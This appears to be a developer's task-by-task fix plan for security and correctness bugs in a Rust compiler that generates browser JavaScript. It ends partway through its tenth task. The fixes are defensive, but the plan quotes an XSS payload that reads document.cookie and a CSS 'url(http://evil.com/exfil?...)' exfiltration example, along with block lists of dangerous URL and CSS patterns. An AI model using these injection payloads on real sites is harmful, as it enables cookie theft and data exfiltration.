# OmniView Review v2 Fix Plan

> **For agentic workers:** REQUIRED SUB-SKILL: Use superpowers:subagent-driven-development (recommended) or superpowers:executing-plans to implement this plan task-by-task. Steps use checkbox (`- [ ]`) syntax for tracking.

**Goal:** Fix all 6 HIGH-severity findings and 10 MEDIUM-severity findings from the 11-specialist architecture review of OmniView codegen.

**Architecture:** Incremental fixes to the existing single-pass OmniViewGenerator codegen (25 files, ~10,738 lines). Each task targets a specific file or small set of files with minimal blast radius. S-effort tasks are 1-5 lines; M-effort tasks are method extractions (10-40 lines). All fixes preserve existing test behavior — snapshot tests must update cleanly.

**Tech Stack:** Rust (omnilang crate), inline JS runtime generation, insta snapshot testing

## Global Constraints

- Zero clippy warnings after each task (`cargo clippy -- -D warnings`)
- All existing 800+ tests must continue passing
- Generated JS snapshot updates are expected for runtime changes — review snapshot diffs carefully
- `debug_assert!` only — no production unwrap/panic
- ES5-compatible JS for all runtime changes (no arrow functions, no `const`/`let`, no template literals in runtime)
- Commit after each task with conventional commit format

---

### Task 1: Fix `format_mutation_stmt_inline` — invalid JS output

**Files:**
- Modify: `omnilang/src/codegen/omniview/stmt.rs:170-216`

**Interfaces:**
- Consumes: `MutationIntent`, `SignalRefIR`, `ExprIR`, `self.expr_to_js()`, `self.name_renames`
- Produces: `format_mutation_stmt_inline()` returns valid JS string

**Background:** The function returns debug placeholder strings like `"count direct_assign 5"` instead of valid JS like `"__omni_subs.get(\"count\").set(5)"`. This is called from `stmt_to_js_inline()` (line 160) → `BlockExpr` codegen in `expr_to_js()`. Confirmed by 3 independent specialists (Rust Expert, TS/React Specialist, Maintainability Expert).

- [ ] **Step 1: Read the working `emit_mutation` method for correct JS patterns**

Read `stmt.rs:244-306` to see how `emit_mutation` correctly generates JS for each `MutationIntent` variant. The fix must produce identical output in string form.

- [ ] **Step 2: Replace `format_mutation_stmt_inline` with buffer-capture from `emit_mutation`**

Replace the entire body of `format_mutation_stmt_inline` (lines 170-216) with a buffer-capture pattern:

```rust
pub(super) fn format_mutation_stmt_inline(&mut self, intent: &MutationIntent) -> String {
    // Capture emit_mutation output by temporarily swapping the JS buffer
    let old_js = std::mem::take(&mut self.js);
    self.emit_mutation(intent);
    let result = std::mem::replace(&mut self.js, old_js);
    // Clean up leading whitespace/newlines from emit_mutation output for inline use
    result.trim().to_string()
}
```

Note: `format_mutation_stmt_inline` must take `&mut self` instead of `&self` because `emit_mutation` needs `&mut self`. Update the call site in `stmt_to_js_inline` (line 159-164) and the signature at line 170.

- [ ] **Step 3: Update `stmt_to_js_inline` call site**

At `stmt.rs:159-164`, the call `self.format_mutation_stmt_inline(intent)` already uses `&mut self` context (the method `stmt_to_js_inline` takes `&self` — change its signature):

```rust
// Line 141: change signature
pub(super) fn stmt_to_js_inline(&mut self, stmt: &StatementIR) -> String {
```

- [ ] **Step 4: Fix all callers of `stmt_to_js_inline`**

Check `expr.rs` for calls to `self.stmt_to_js_inline()` — these already have `&mut self` context (they're methods on `OmniViewGenerator`). Verify compilation passes.

- [ ] **Step 5: Run tests**

```bash
cargo test -p omnilang -- omniview 2>&1 | tail -20
```

Expected: all omniview tests pass. No new failures. If `BlockExpr` tests exist, they now produce valid JS instead of placeholder strings.

- [ ] **Step 6: Commit**

```bash
git add omnilang/src/codegen/omniview/stmt.rs
git commit -m "fix(omniview): replace format_mutation_stmt_inline placeholders with real JS codegen

format_mutation_stmt_inline was emitting debug strings like
'count direct_assign 5' instead of valid JS. Used buffer-capture
pattern to delegate to emit_mutation, which produces correct
__omni_subs.get().set() calls.

Found by 3 independent reviewers (Rust Expert, TS/React Specialist,
Maintainability Expert) in 2026-07-29 v2 architecture review.

Co-Authored-By: Claude <noreply@anthropic.com>"
```

---

### Task 2: Fix boolean attribute detection for complex expressions

**Files:**
- Modify: `omnilang/src/codegen/omniview/view/element.rs:135-157`

**Interfaces:**
- Consumes: `ExprIR`, `self.expr_to_js()`, `self.expr_to_static_str()`, `self.signal_names`
- Produces: Correct reactive bindings for `disabled={!condition}`, `checked={count > 0}`

**Background:** The string heuristic `val_str.starts_with('{') && val_str.ends_with('}')` only catches simple identifier expressions like `{count}`. Complex expressions like `disabled={!isSubmitting}` or `checked={count > 0}` cause `expr_to_static_str` to return `""`, which falls through to bare attribute emission (always true). Found by TypeScript/React Specialist.

- [ ] **Step 1: Replace the string heuristic with ExprIR type matching**

Replace lines 135-157 in `view/element.rs`:

```rust
// BEFORE (line 135-136):
// if val_str.starts_with('{') && val_str.ends_with('}') {

// AFTER: use ExprIR type matching instead of string heuristic
let is_dynamic = !matches!(value, ExprIR::LiteralExpr { .. });
if is_dynamic {
    // Dynamic attribute: bind reactively
    let js_val = self.expr_to_js(value);
    let js_access = if self.signal_names.contains(&js_val) {
        format!("{}.value", js_val)
    } else {
        js_val
    };
    if is_boolean_attr {
        let _ = writeln!(self.js,
            "__omni_effect(() => {{ const el = __omni_el(\"{}\"); if (el) try {{ el.{} = !!({}); }} catch(e) {{ __omni_reportError(\"bind:attr:{}\", e); }} }});",
            nid, name, js_access, name
        );
    } else {
        let _ = writeln!(self.js,
            "__omni_effect(() => {{ const el = __omni_el(\"{}\"); if (el) try {{ el.setAttribute('{}', {}); }} catch(e) {{ __omni_reportError(\"bind:attr:{}\", e); }} }});",
            nid, name, js_access, name
        );
    }
} else if is_boolean_attr && val_str == "true" {
    // Boolean attribute with literal true: emit bare attribute name
    let _ = write!(attrs, " {}", name);
} else if is_boolean_attr && val_str == "false" {
    // Boolean attribute with literal false: skip entirely
} else if !val_str.is_empty() {
    let _ = write!(attrs, " {}=\"{}\"", name, escape_html(&val_str));
} else {
    let _ = write!(attrs, " {}", name);
}
```

- [ ] **Step 2: Verify the LiteralExpr import is available**

Check `view/element.rs` imports — `ExprIR` and its variants are used throughout the file. `ExprIR::LiteralExpr` is already referenced elsewhere in the codebase. If needed, add `use crate::ir::ExprIR;` to the import block.

- [ ] **Step 3: Update snapshot tests**

```bash
cargo test -p omnilang -- omniview 2>&1 | tail -20
```

Existing tests that use simple `{signalName}` expressions for boolean attributes will continue working (the new path produces identical `expr_to_js` output for identifiers). Snapshot updates only if tests exist for `disabled={!condition}` patterns. Review with `cargo insta review`.

- [ ] **Step 4: Commit**

```bash
git add omnilang/src/codegen/omniview/view/element.rs
git commit -m "fix(omniview): fix boolean attribute detection for complex expressions

Replace string heuristic (starts_with('{') && ends_with('}')) with
ExprIR::LiteralExpr type check. The heuristic failed on complex
expressions like disabled={!condition} or checked={count > 0},
causing them to silently emit permanent-true attributes.

Found by TypeScript/React Specialist in 2026-07-29 v2 review.

Co-Authored-By: Claude <noreply@anthropic.com>"
```

---

### Task 3: Fix nested @for buffer corruption

**Files:**
- Modify: `omnilang/src/codegen/omniview/component_html.rs:31-121`
- Modify: `omnilang/src/codegen/omniview/list.rs:48-62`

**Interfaces:**
- Consumes: `self.for_text_bindings`, `self.for_class_bindings`, `self.for_attr_bindings`, `self.for_rebind_fn`, `self.in_for_template`
- Produces: Saved/restored @for state across nested component inlining

**Background:** When a component containing `@for` is inlined inside another `@for`, the inner loop's `emit_list_state_init` clears the outer loop's binding vectors. The inner `emit_list_dom` also sets `in_for_template = false`, breaking the outer loop's template processing. Found by Compiler Architect (Dr. Lin Wei).

- [ ] **Step 1: Add save/restore for @for state in `try_inline_component`**

In `component_html.rs`, at line 31 (inside `if self.in_for_template`), add save of @for state before the child component's signal registration, and restore at line 123 (alongside existing saves/restores).

After the existing save block (line 29), add @for state save:

```rust
// Save @for loop state to prevent inner component @for loops
// from corrupting outer loop's binding buffers
let saved_for_text = std::mem::take(&mut self.for_text_bindings);
let saved_for_class = std::mem::take(&mut self.for_class_bindings);
let saved_for_attr = std::mem::take(&mut self.for_attr_bindings);
let saved_for_rebind = self.for_rebind_fn.take();
let saved_in_for = self.in_for_template;
```

At line 123-126 (the restore section), add @for state restore:

```rust
// Restore @for loop state
self.for_text_bindings = saved_for_text;
self.for_class_bindings = saved_for_class;
self.for_attr_bindings = saved_for_attr;
self.for_rebind_fn = saved_for_rebind;
self.in_for_template = saved_in_for;
// Restore parent context
self.current_component = saved_component;
self.signal_names = saved_signal_names;
self.name_renames = saved_renames_child;
```

- [ ] **Step 2: Also add `for_state_names.clear()` in `emit_list_state_init`**

At `list.rs:53`, after `self.for_attr_bindings.clear();`, add:

```rust
self.for_state_names.clear();
```

This prevents stale entries from leaking between @for loops (separate but related finding by Rust Expert + Domain Expert).

- [ ] **Step 3: Run tests**

```bash
cargo test -p omnilang -- omniview 2>&1 | tail -30
```

Expected: all tests pass. The save/restore pattern is zero-cost when no nested @for exists — `std::mem::take` on empty vectors returns empty vectors, restore puts them back.

- [ ] **Step 4: Add a regression test for nested @for**

In `omnilang/src/codegen/omniview/tests_regression/list.rs`, add a test that compiles a component with @for containing another component with @for:

```rust
#[test]
fn nested_for_does_not_corrupt_outer_loop() {
    let source = r#"
component Outer {
    signal items = ["a", "b"]
    view {
        @for item in items {
            <Inner prefix={item} />
        }
    }
}
component Inner {
    prop prefix = ""
    signal tags = ["x", "y"]
    view {
        @for tag in tags {
            <span>{prefix}-{tag}</span>
        }
    }
}
"#;
    let output = compile_and_get_output(source);
    // Verify both loops produce correct output
    assert!(output.contains("a-x"));
    assert!(output.contains("a-y"));
    assert!(output.contains("b-x"));
    assert!(output.contains("b-y"));
    // Verify no stale binding corruption
    // Outer loop should have its own bindings, inner loop its own
}
```

- [ ] **Step 5: Commit**

```bash
git add omnilang/src/codegen/omniview/component_html.rs omnilang/src/codegen/omniview/list.rs omnilang/src/codegen/omniview/tests_regression/list.rs
git commit -m "fix(omniview): prevent nested @for buffer corruption in component inlining

Save/restore for_text_bindings, for_class_bindings, for_attr_bindings,
for_rebind_fn, and in_for_template around nested component inlining
in try_inline_component. Inner @for loops were clearing the outer
loop's binding vectors, producing silently wrong output.

Also add for_state_names.clear() in emit_list_state_init to prevent
stale state leakage between @for loops.

Found by Compiler Architect (Dr. Lin Wei) in 2026-07-29 v2 review.

Co-Authored-By: Claude <noreply@anthropic.com>"
```

---

### Task 4: Add URL sanitization for reactive href/src bindings

**Files:**
- Modify: `omnilang/src/codegen/omniview/runtime.rs:97-113` (add `__omni_sanitizeUrl`)
- Modify: `omnilang/src/codegen/omniview/view/element.rs:153-156` (wrap reactive URL attribute setters)

**Interfaces:**
- Produces: `__omni_sanitizeUrl(value)` — returns sanitized URL or original string if safe
- Consumes: Runtime function called from generated JS for `href`, `src`, `action`, `formaction`

**Background:** Reactive attribute bindings for URL-bearing attributes (`href`, `src`, `action`, etc.) use `el.setAttribute('href', signal.value)` with no URL scheme validation. A user-controlled signal can inject `javascript:alert(document.cookie)`. Found by Security Specialist (HIGH).

- [ ] **Step 1: Add `__omni_sanitizeUrl` to the runtime**

In `runtime.rs`, after the `__omni_reportError` function (line 113), add:

```rust
self.js.push_str(
    r#"
function __omni_sanitizeUrl(url) {
  if (typeof url !== 'string') return url;
  var trimmed = url.trim().toLowerCase();
  if (trimmed.startsWith('javascript:') || trimmed.startsWith('data:text/html') || trimmed.startsWith('vbscript:')) {
    return '#blocked';
  }
  return url;
}
"#,
);
```

- [ ] **Step 2: Wrap reactive URL attribute `setAttribute` calls with sanitization**

In `view/element.rs`, the reactive attribute binding path (now using `is_dynamic` from Task 2). For URL-bearing attributes, wrap the value with `__omni_sanitizeUrl()`:

Define the set of URL-bearing attributes:

```rust
let is_url_attr = matches!(
    name.as_str(),
    "href" | "src" | "action" | "formaction"
);
```

In the non-boolean dynamic attribute branch, when `is_url_attr` is true:

```rust
if is_url_attr {
    let _ = writeln!(self.js,
        "__omni_effect(() => {{ const el = __omni_el(\"{}\"); if (el) try {{ el.setAttribute('{}', __omni_sanitizeUrl({})); }} catch(e) {{ __omni_reportError(\"bind:attr:{}\", e); }} }});",
        nid, name, js_access, name
    );
} else {
    let _ = writeln!(self.js,
        "__omni_effect(() => {{ const el = __omni_el(\"{}\"); if (el) try {{ el.setAttribute('{}', {}); }} catch(e) {{ __omni_reportError(\"bind:attr:{}\", e); }} }});",
        nid, name, js_access, name
    );
}
```

- [ ] **Step 3: Run tests and update snapshots**

```bash
cargo test -p omnilang -- omniview 2>&1 | tail -30
cargo insta review
```

Review snapshot diffs: all generated JS should now include the `__omni_sanitizeUrl` function in the runtime, and any reactive `href`/`src` bindings should be wrapped.

- [ ] **Step 4: Commit**

```bash
git add omnilang/src/codegen/omniview/runtime.rs omnilang/src/codegen/omniview/view/element.rs
git commit -m "fix(omniview): add URL sanitization for reactive href/src bindings

Add __omni_sanitizeUrl() runtime function that blocks javascript:,
data:text/html, and vbscript: URL schemes. Wrap generated
el.setAttribute() calls for href, src, action, and formaction
attributes with sanitization.

Prevents XSS via user-controlled signal values bound to URL attributes.

Found by Security Specialist in 2026-07-29 v2 architecture review.

Co-Authored-By: Claude <noreply@anthropic.com>"
```

---

### Task 5: Add `debug_assert!` phase guards

**Files:**
- Modify: `omnilang/src/codegen/omniview/mod.rs:230-389` (generate function)
- Modify: `omnilang/src/codegen/omniview/view/element.rs` (JS emission entry points)
- Modify: `omnilang/src/codegen/omniview/store.rs` (store emission entry)

**Interfaces:**
- Produces: `debug_assert!` guards at all JS emission entry points
- Consumes: `self.css_only`, `self.dom_emitted`

**Background:** Three bool flags (`css_only`, `in_for_template`, `editor_mode`) control where JS output is routed, but there are no runtime checks preventing writes to the wrong buffer. The deferred JS swap means `self.js` isn't always the main buffer. Phase confusion caused the ADR-025 `__omni_effect` leak. Found by Systems Architect (HIGH).

- [ ] **Step 1: Add helper method for phase assertion**

In `mod.rs`, add to `impl OmniViewGenerator`:

```rust
/// Assert that JS emission is allowed (not in css_only mode, not after DOM emission).
/// Only active in debug builds — zero cost in release.
#[track_caller]
fn assert_can_emit_js(&self) {
    debug_assert!(!self.css_only, "JS emission in css_only mode");
    debug_assert!(!self.dom_emitted, "JS emission after DOM phase — use mount_js instead");
}
```

- [ ] **Step 2: Add assertions at key entry points**

In `store.rs`:
- `emit_store()` (line 34): add `self.assert_can_emit_js();` as first line
- `generate_component()` (line 115): add `self.assert_can_emit_js();` as first line after `if is_root` check

In `view/element.rs`:
- `emit_element_events()`: add `self.assert_can_emit_js();` as first line
- `emit_element_inline_style()` (in `view/style.rs`): add `self.assert_can_emit_js();` as first line

In `runtime.rs`:
- `emit_signal_runtime()`: add guard (but this runs before css_only guard in `generate()` — use `debug_assert!(!self.dom_emitted)`)

In `motion_triggers.rs`:
- `emit_motion_triggers_for_element()`: add `self.assert_can_emit_js();` as first line

In `component_html.rs`:
- `try_inline_component()`: add assertion only in non-@for branch (the @for branch writes to for_*_bindings, not self.js directly)

- [ ] **Step 3: Run tests in debug mode**

```bash
cargo test -p omnilang -- omniview 2>&1 | tail -20
```

All tests run in debug mode by default — any assertion failures will panic with the file:line location. Fix any that fire (should be zero if the guards are placed correctly).

- [ ] **Step 4: Commit**

```bash
git add omnilang/src/codegen/omniview/mod.rs omnilang/src/codegen/omniview/view/element.rs omnilang/src/codegen/omniview/view/style.rs omnilang/src/codegen/omniview/store.rs omnilang/src/codegen/omniview/motion_triggers.rs omnilang/src/codegen/omniview/component_html.rs
git commit -m "fix(omniview): add debug_assert phase guards at JS emission entry points

Prevent accidental JS emission during css_only mode or after DOM phase
with debug_assert! guards. Catches phase-confusion bugs (like the
ADR-025 __omni_effect leak) at development time with zero release cost.

Found by Systems Architect in 2026-07-29 v2 architecture review.

Co-Authored-By: Claude <noreply@anthropic.com>"
```

---

### Task 6: Add CSP meta tag to standalone HTML wrapper

**Files:**
- Modify: `omnilang/src/codegen/omniview/utils.rs:232-255` (html_document_wrapper)

**Interfaces:**
- Produces: `<meta http-equiv="Content-Security-Policy">` tag in generated HTML
- Consumes: `editor_mode` flag (CSP only for standalone mode)

**Background:** The generated HTML document wrapper contains no CSP meta tag. In standalone deployment, any DOM-based XSS has unrestricted script execution. Editor mode uses iframe sandbox instead. Found by Security Specialist (MEDIUM).

- [ ] **Step 1: Add CSP meta tag to `html_document_wrapper`**

In `utils.rs`, the `html_document_wrapper` function. Add a `csp` parameter or use a default:

```rust
pub(super) fn html_document_wrapper(body_html: &str, include_csp: bool) -> String {
    let csp_meta = if include_csp {
        r#"<meta http-equiv="Content-Security-Policy" content="default-src 'self'; script-src 'self'; style-src 'self' 'unsafe-inline'; img-src 'self' data: https:; connect-src 'self';">"#
    } else {
        ""
    };
    // ... rest of wrapper with {csp_meta} after charset meta
}
```

- [ ] **Step 2: Update call sites**

Search for all calls to `html_document_wrapper`. The main call is in `mod.rs` (OmniViewCodegen::generate). Pass `true` for standalone mode (non-editor), `false` for editor mode:

```rust
// In mod.rs OmniViewCodegen::generate():
let html = utils::html_document_wrapper(&output.html, !self.editor_mode);
```

- [ ] **Step 3: Run tests**

```bash
cargo test -p omnilang -- omniview 2>&1 | tail -20
```

Snapshot tests will update to include the CSP meta tag for non-editor mode output.

- [ ] **Step 4: Commit**

```bash
git add omnilang/src/codegen/omniview/utils.rs omnilang/src/codegen/omniview/mod.rs
git commit -m "feat(omniview): add Content-Security-Policy meta tag to standalone HTML

Add CSP meta tag to generated HTML for standalone (non-editor) mode.
Blocks inline scripts, restricts images and connections to self-origin.
Editor mode uses iframe sandbox instead.

Found by Security Specialist in 2026-07-29 v2 architecture review.

Co-Authored-By: Claude <noreply@anthropic.com>"
```

---

### Task 7: Add CSS sanitization for runtime signal-driven styles

**Files:**
- Modify: `omnilang/src/codegen/omniview/runtime.rs` (add `__omni_sanitizeCss`)
- Modify: `omnilang/src/codegen/omniview/view/style.rs:32-119` (wrap dynamic style values)

**Interfaces:**
- Produces: `__omni_sanitizeCss(value)` — blocks CSS injection patterns
- Consumes: Called from `$signal`, `$concat`, `$call` dynamic style paths

**Background:** `sanitize_css_value` (compile-time) blocks `javascript:`, `expression(`, `url(`, etc., but signal-driven dynamic styles bypass it entirely. A signal value containing `url(http://evil.com/exfil?data=...)` assigned to `el.style.backgroundImage` exfiltrates data. Found by Security Specialist (MEDIUM).

- [ ] **Step 1: Add `__omni_sanitizeCss` to the runtime**

After `__omni_sanitizeUrl` in `runtime.rs`, add:

```rust
self.js.push_str(
    r#"
function __omni_sanitizeCss(value) {
  if (typeof value !== 'string') return value;
  var lower = value.toLowerCase();
  if (lower.indexOf('javascript:') >= 0 || lower.indexOf('expression(') >= 0 ||
      lower.indexOf('url(') >= 0 || lower.indexOf('-moz-binding') >= 0 ||
      lower.indexOf('data:text/html') >= 0 || lower.indexOf('@import') >= 0 ||
      lower.indexOf('vbscript:') >= 0 || lower.indexOf('document.') >= 0 ||
      lower.indexOf('window.') >= 0) {
    return '';
  }
  return value;
}
"#,
);
```

- [ ] **Step 2: Wrap dynamic style value expressions**

In `view/style.rs`, the three dynamic paths:

For `$signal` path (line 48): wrap the value expression:
```rust
self.emit_style_assignment(js_prop, &format!("__omni_sanitizeCss({}.value)", prefixed));
```

For `$concat` path (line 78): wrap the final concatenation:
```rust
self.emit_style_assignment(js_prop, &format!("__omni_sanitizeCss({})", js_parts.join(" + ")));
```

For `$call` path (line 116-118): wrap the call result:
```rust
self.emit_style_assignment(js_prop, &format!("__omni_sanitizeCss({})", call_expr));
```

- [ ] **Step 3: Run tests and update snapshots**

```bash
cargo test -p omnilang -- omniview 2>&1 | tail -30
cargo insta review
```

- [ ] **Step 4: Commit**

```bash
git add omnilang/src/codegen/omniview/runtime.rs omnilang/src/codegen/omniview/view/style.rs
git commit -m "fix(omniview): add CSS sanitization for runtime signal-driven styles

Add __omni_sanitizeCss() runtime function mirroring compile-time
sanitize_css_value. Blocks javascript:, expression(), url(),
-moz-binding, data:text/html, @import, vbscript:, and
document./window. references in dynamic style values.

Previously, $signal/$concat/$call style bindings bypassed the
compile-time CSS sanitizer entirely.

Found by Security Specialist in 2026-07-29 v2 architecture review.

Co-Authored-By: Claude <noreply@anthropic.com>"
```

---

### Task 8: Extract shared event listener emission

**Files:**
- Modify: `omnilang/src/codegen/omniview/view/events.rs:131-173`
- Modify: `omnilang/src/codegen/omniview/component_html.rs:170-235`

**Interfaces:**
- Produces: `emit_event_listener(nid, js_event, handler, el)` — single source of truth for addEventListener JS generation
- Consumes: Called from `emit_element_events()` and `try_inline_component()`

**Background:** All three `EventHandlerIR` variants (FnRef, StoreAction, InlineFn) are duplicated verbatim across `events.rs` and `component_html.rs` — 8 independent addEventListener generation points. A fix applied to only one file would leave the other emitting broken JS. Found by Domain Expert, Maintainability Expert, Compiler Architect (3×MEDIUM).

- [ ] **Step 1: Add `emit_event_listener` method to OmniViewGenerator**

In `view/events.rs`, add a new `pub(super)` method:

```rust
/// Emit a single addEventListener call for one event handler.
/// Single source of truth — called from both emit_element_events() and
/// try_inline_component() to prevent drift between the two code paths.
pub(super) fn emit_event_listener(
    &mut self,
    nid: &str,
    js_event: &str,
    handler: &EventHandlerIR,
    sp: &str,  // stopPropagation flag suffix
    pd: &str,  // preventDefault flag suffix
) {
    match handler {
        EventHandlerIR::FnRef { r#ref, .. } => {
            // Check if this is a motion reference
            if self.motion_names.contains(r#ref.as_str()) {
                let _ = writeln!(self.js,
                    "const el = __omni_el(\"{}\"); if (el) el.addEventListener(\"{}\", (e) => {{ try {{ __omni_motion_{}(el, e); }} catch(err) {{ __omni_reportError(\"event:{}\", err); }} }}{}{});",
                    nid, js_event, r#ref, js_event, sp, pd
                );
            } else {
                let prefixed = format!("{}_{}", self.current_component, r#ref);
                let _ = writeln!(self.js,
                    "const el = __omni_el(\"{}\"); if (el) el.addEventListener(\"{}\", (e) => {{ try {{ {}(e); }} catch(err) {{ __omni_reportError(\"event:{}\", err); }} }}{}{});",
                    nid, js_event, prefixed, js_event, sp, pd
                );
            }
        }
        EventHandlerIR::StoreAction { r#ref, .. } => {
            let resolved = r#ref.replace('.', "_");
            let _ = writeln!(self.js,
                "const el = __omni_el(\"{}\"); if (el) el.addEventListener(\"{}\", (e) => {{ try {{ {}(e); }} catch(err) {{ __omni_reportError(\"event:{}\", err); }} }}{}{});",
                nid, js_event, resolved, js_event, sp, pd
            );
        }
        EventHandlerIR::InlineFn { body, params, .. } => {
            // Generate wrapper function name
            let func_name = format!("__omni_handler_{}_{}", nid.replace('-', "_"), js_event);
            let param_str = if params.is_empty() {
                "e".to_string()
            } else {
                params.join(", ")
            };
            // Emit function declaration (goes to same buffer as events)
            let _ = writeln!(self.js,
                "function {}({}) {{",
                func_name, param_str
            );
            for stmt in &body.statements {
                self.emit_statement(stmt);
            }
            self.js.push_str("}\n");
            // Emit listener
            let _ = writeln!(self.js,
                "const el = __omni_el(\"{}\"); if (el) el.addEventListener(\"{}\", (e) => {{ try {{ {}(e); }} catch(err) {{ __omni_reportError(\"event:{}\", err); }} }}{}{});",
                nid, js_event, func_name, js_event, sp, pd
            );
        }
    }
}
```

- [ ] **Step 2: Replace inline code in `emit_element_events`**

In `events.rs:131-173`, replace the match block with calls to `self.emit_event_listener()`. For each handler, compute `sp`/`pd` suffix from `Self::flag_suffix` (already at lines 19-26), then call:

```rust
let (sp, pd) = Self::flag_suffix(el, event_name);
self.emit_event_listener(&nid, &js_event, handler, sp, pd);
```

- [ ] **Step 3: Replace inline code in `try_inline_component`**

In `component_html.rs:170-235`, same pattern. Compute `sp`/`pd` inline (the component inlining path doesn't use `Self::flag_suffix` — extract the logic):

```rust
let sp = if handler.prevent_default() { ", {passive: false}" } else { "" };
let pd = if handler.stop_propagation() { ".preventDefault()" } else { "" };
// pd needs to be in the listener, not the addEventListener options — adjust based on existing pattern
self.emit_event_listener(nid, &js_event, handler, sp, pd);
```

- [ ] **Step 4: Run tests**

```bash
cargo test -p omnilang -- omniview 2>&1 | tail -30
```

Expected: all tests pass with identical generated JS output. No snapshot changes (this is a pure refactor — output must be byte-identical).

- [ ] **Step 5: Verify byte-identical output**

```bash
cargo test -p omnilang -- omniview 2>&1 | grep "snapshot"
```

No snapshot differences should appear. If any do, the refactor changed output — fix the emission to match exactly.

- [ ] **Step 6: Commit**

```bash
git add omnilang/src/codegen/omniview/view/events.rs omnilang/src/codegen/omniview/component_html.rs
git commit -m "refactor(omniview): extract shared emit_event_listener method

Replace 8 duplicated addEventListener emission points across
events.rs and component_html.rs with a single emit_event_listener()
method handling all three EventHandlerIR variants (FnRef, StoreAction,
InlineFn). Pure refactor — output is byte-identical.

Found by Domain Expert, Maintainability Expert, and Compiler
Architect in 2026-07-29 v2 architecture review.

Co-Authored-By: Claude <noreply@anthropic.com>"
```

---

### Task 9: Add try/catch guard on `__omni_replaceComponent` eval

**Files:**
- Modify: `omnilang/src/codegen/omniview/editor.rs:93-110`

**Interfaces:**
- Produces: Try/catch-wrapped eval with error postMessage and old component restore
- Consumes: `__omni_replaceComponent` function body in generated editor bridge JS

**Background:** `(0, eval)(factoryCode)` in `__omni_replaceComponent` has no error handling. A buggy compilation → SyntaxError → old component already torn down → blank region with no recovery. Found by AI Engineer (MEDIUM).

- [ ] **Step 1: Wrap eval in try/catch with recovery**

Replace the `__omni_replaceComponent` function body at `editor.rs:93-110`:

```rust
self.js.push_str(
    r#"
function __omni_replaceComponent(name, factoryCode) {
  var oldComp = window.__omni_components[name];
  var savedSignals = {};
  if (oldComp && oldComp.signals) {
    Object.keys(oldComp.signals).forEach(function(k) {
      savedSignals[k] = oldComp.signals[k].peek();
    });
  }
  try {
    window.__omni_components[name] = (0, eval)(factoryCode);
  } catch(e) {
    try {
      parent.postMessage({ type: 'omni-replace-error', name: name, error: String(e) }, window.location.origin);
    } catch(_) {}
    // Restore old component if available
    if (oldComp) window.__omni_components[name] = oldComp;
    return;
  }
  if (oldComp && oldComp.teardown) oldComp.teardown();
  var newComp = window.__omni_components[name];
  if (newComp && newComp.signals) {
    Object.keys(savedSignals).forEach(function(k) {
      if (newComp.signals[k]) newComp.signals[k].set(savedSignals[k]);
    });
  }
  parent.postMessage({ type: 'omni-rendered', nidMap: __omni_buildNidMap() }, window.location.origin);
}
"#,
);
```

Key changes:
1. `(0, eval)(factoryCode)` wrapped in try/catch
2. On error: post `omni-replace-error` message to parent frame, restore old component, return early
3. `oldComp.teardown()` moved AFTER successful eval (don't teardown until replacement succeeds)

- [ ] **Step 2: Run tests**

```bash
cargo test -p omnilang -- omniview 2>&1 | tail -20
```

- [ ] **Step 3: Commit**

```bash
git add omnilang/src/codegen/omniview/editor.rs
git commit -m "fix(omniview): add error recovery to __omni_replaceComponent eval

Wrap (0, eval)(factoryCode) in try/catch with postMessage error
notification and old component restoration. Don't teardown old
component until replacement succeeds. Prevents blank component
regions from malformed compilations in the iterative AI editing loop.

Found by AI Engineer in 2026-07-29 v2 architecture review.

Co-Authored-By: Claude <noreply@anthropic.com>"
```

---

### Task 10: Add error severity categorization

**Files:**
- Modify: `omnilang/src/codegen/omniview/runtime.rs:97-113` (restructure error object)

**Interfaces:**
- Produces: Error objects with `severity`, `code`, `message`, `time` fields
- Consumes: `window.__omni_runtimeErrors` array, `postMessage` channel

**Background:** All runtime errors report identically — no severity levels, error codes, or recovery hints. The 100-entry FIFO buffer means transient error bursts evict real bugs. An AI-powered diagnostic tool cannot distinguish warnings from fatal errors. Found by AI Engineer (MEDIUM).

- [ ] **Step 1: Restructure `__omni_reportError` with severity parsing**

Replace the `__omni_reportError` function body at `runtime.rs:97-113`:

```rust
self.js.push_str(
    r#"
function __omni_reportError(context, error) {
  var severity = "error";
  var code = context;
  // Parse severity prefix from context: "warn:xxx", "error:xxx", "fatal:xxx"
  if (context.indexOf(":") >= 0) {
    var parts = context.split(":");
    var prefix = parts[0];
    if (prefix === "warn" || prefix === "error" || prefix === "fatal") {
      severity = prefix;
      code = parts.slice(1).join(":");
    }
  }
  var msg = "[OmniView] " + severity.toUpperCase() + " " + code + ": " + String(error);
  if (severity === "fatal") {
    console.error(msg);
  } else if (severity === "warn") {
    console.warn(msg);
  } else {
    console.error(msg);
  }
  if (!window.__omni_runtimeErrors) window.__omni_runtimeErrors = [];
  if (window.__omni_runtimeErrors.length >= 100) window.__omni_runtimeErrors.shift();
  window.__omni_runtimeErrors.push({
    severity: severity,
    code: code,
    message: String(error),
    time: Date.now()
  });
  try {
    if (typeof parent !== 'undefined' && parent.postMessage) {
      parent.postMessage({
        type: 'omni-runtime-error',
        severity: severity,
        code: code,
        message: String(error),
        timestamp: Date.now()
      }, window.location.origin);
    }
  } catch(_) {}
}
"#,
);
```

- [ ] **Step 2: Batch-update all `__omni_reportError` callsites with severity prefixes**

Search all `.rs` files in `omnilang/src/codegen/omniview/` for `__omni_reportError`:

```bash
grep -rn "__omni_reportError" omnilang/src/codegen/omniview/
```

Update each callsite:

| Current context | New context | Rationale |
|----------------|-------------|-----------|
| `"interpolation:text"` | `"warn:interpolation:text"` | Transient — element may not exist yet |
| `"event:click"` | `"error:event:click"` | Handler failure |
| `"event:input"` | `"error:event:input"` | Handler failure |
| `"effect:cleanup"` | `"warn:effect:cleanup"` | Transient |
| `"bind:attr:disabled"` | `"error:bind:attr:disabled"` | Attribute binding failure |

In `view/mod.rs:190`, `view/events.rs`, `component_html.rs`: change context strings to include severity prefix.

- [ ] **Step 3: Run tests and update snapshots**

```bash
cargo test -p omnilang -- omniview 2>&1 | tail -30
cargo insta review
```

All snapshots will update — the error object structure changed and context strings now have severity prefixes.

- [ ] **Step 4: Commit**

```bash
git add omnilang/src/codegen/omniview/runtime.rs omnilang/src/codegen/omniview/view/mod.rs omnilang/src/codegen/omniview/view/events.rs omnilang/src/codegen/omniview/component_html.rs
git commit -m "feat(omniview): add error severity categorization to runtime

Restructure __omni_reportError to parse severity prefixes (warn:,
error:, fatal:) from context strings. Error objects now include
severity, code, message, and time fields. Console output uses
appropriate log level per severity. Batch-updated all callsites
with severity-appropriate prefixes.

Enables AI-powered diagnostic tools to filter and prioritize errors.

